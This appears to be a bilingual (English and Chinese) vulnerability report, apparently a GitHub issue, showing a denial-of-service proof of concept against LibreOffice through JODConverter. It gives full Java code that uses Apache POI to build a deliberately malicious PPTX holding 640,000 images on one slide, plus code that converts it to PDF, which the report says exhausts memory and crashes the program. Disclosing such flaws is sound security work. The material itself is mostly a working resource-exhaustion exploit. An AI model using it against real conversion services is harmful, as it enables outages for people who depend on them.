1. Generate malicious ppt files, using Java's POI plugin to generate them
Produce a PowerPoint file with only one slide through the POI plugin, containing a total of 640000 images of 800 * 800

The code is as follows：
···
public class PowerPointUtil {
    private static final int NUM =800;
    public static void main(String[] args) {
        String path="E:\\office\\test.pptx";
        try {
            createPPT(path);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static void createPPT(String path) throws IOException {
        XMLSlideShow ppt = new XMLSlideShow();
        XSLFSlide slide = ppt.createSlide();
        byte[] bt = FileUtils.readFileToByteArray(new File("E:\\office\\test.png"));

        for (int i = 0; i < NUM; i++) {
            for (int j = 0; j < NUM; j++) {
                XSLFPictureData pictureData = ppt.addPicture(bt, PictureData.PictureType.PNG);
                XSLFPictureShape pic = slide.createPicture(pictureData);
                pic.setAnchor(new Rectangle(i, j, 50, 50));
            }
        }
        ppt.write(new FileOutputStream(path));
    }
}
···

2\Operate libreoffice through the org. jdconverter dependency package, and initialize the configuration as follows

The code is as follows：

public class OfficeManagerInstance {
    private static OfficeManager INSTANCE = null;
    public static synchronized void start() {
        officeManagerStart();
    }
    public static synchronized void stop() {
        try {
            INSTANCE.stop();
        } catch (OfficeException e) {
            e.printStackTrace();
        }
    }
    public static void init() {

            LocalOfficeManager.Builder builder = LocalOfficeManager.builder().install();
            builder.officeHome("E:\\libreOffice\\");
            builder.portNumbers(8098);
            builder.taskExecutionTimeout(5 * 1000 * 60); // minute
            builder.taskQueueTimeout(10 * 1000 * 60 * 60); // hour

            INSTANCE = builder.build();
            officeManagerStart();

    }
    private static void officeManagerStart() {
        if (INSTANCE.isRunning()) {
            return;
        }
        try {
            INSTANCE.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

3、Finally, call the OfficeManager to execute the operation of converting ppt to pdf

The code is as follows：

public class LibreOfficeUtil {
    public static void main(String[] args) {
        String pptPath="E:\\office\\test.pptx";
        String pdfPath="E:\\office\\test.pdf";

        OfficeManagerInstance.init();
        OfficeManagerInstance.start();

        try {
            JodConverter.convert(new File(pptPath)).to(new File(pdfPath)).execute();
        } catch (OfficeException e) {
            e.printStackTrace();
        }finally {
            OfficeManagerInstance.stop();
        }
    }
}

4、Upon checking the memory usage, it was found that libreoffice was consuming a large amount of memory on the machine, which led to program crashes and DOS issues

![RS0_6I){_MC}D)``}36A0RC](https://github.com/bzdxtdlsd/test1/assets/58172556/d5210e71-a12c-4d98-a6e8-9d9322f9949e)


1、生成恶意的 ppt 文件，这里采用 java 的 poi 插件去生成
通过 poi 插件，生产一个只有一张幻灯片的 ppt 文件，其中含有 800*800 共 64 万张图片 

代码如下：

public class PowerPointUtil {
    private static final int NUM =800;
    public static void main(String[] args) {
        String path="E:\\office\\test.pptx";
        try {
            createPPT(path);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static void createPPT(String path) throws IOException {
        XMLSlideShow ppt = new XMLSlideShow();
        XSLFSlide slide = ppt.createSlide();
        byte[] bt = FileUtils.readFileToByteArray(new File("E:\\office\\test.png"));

        for (int i = 0; i < NUM; i++) {
            for (int j = 0; j < NUM; j++) {
                XSLFPictureData pictureData = ppt.addPicture(bt, PictureData.PictureType.PNG);
                XSLFPictureShape pic = slide.createPicture(pictureData);
                pic.setAnchor(new Rectangle(i, j, 50, 50));
            }
        }
        ppt.write(new FileOutputStream(path));
    }
}

2、通过 org.jodconverter 依赖包操作 libreoffice，初始化配置如下
代码片段：

public class OfficeManagerInstance {
    private static OfficeManager INSTANCE = null;
    public static synchronized void start() {
        officeManagerStart();
    }
    public static synchronized void stop() {
        try {
            INSTANCE.stop();
        } catch (OfficeException e) {
            e.printStackTrace();
        }
    }
    public static void init() {

            LocalOfficeManager.Builder builder = LocalOfficeManager.builder().install();
            builder.officeHome("E:\\libreOffice\\");
            builder.portNumbers(8098);
            builder.taskExecutionTimeout(5 * 1000 * 60); // minute
            builder.taskQueueTimeout(10 * 1000 * 60 * 60); // hour

            INSTANCE = builder.build();
            officeManagerStart();

    }
    private static void officeManagerStart() {
        if (INSTANCE.isRunning()) {
            return;
        }
        try {
            INSTANCE.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

3、最后调用 OfficeManager 去执行 ppt 转 pdf 的操作
代码如下：

public class LibreOfficeUtil {
    public static void main(String[] args) {
        String pptPath="E:\\office\\test.pptx";
        String pdfPath="E:\\office\\test.pdf";

        OfficeManagerInstance.init();
        OfficeManagerInstance.start();

        try {
            JodConverter.convert(new File(pptPath)).to(new File(pdfPath)).execute();
        } catch (OfficeException e) {
            e.printStackTrace();
        }finally {
            OfficeManagerInstance.stop();
        }
    }
}

4、查看内存占用情况，发现 libreoffice 占用机器大量内存，之后程序崩溃，产生 DOS 问题

![RS0_6I){_MC}D)``}36A0RC](https://github.com/bzdxtdlsd/test1/assets/58172556/8a911d64-e18d-4d4b-8b36-8537307b93e7)

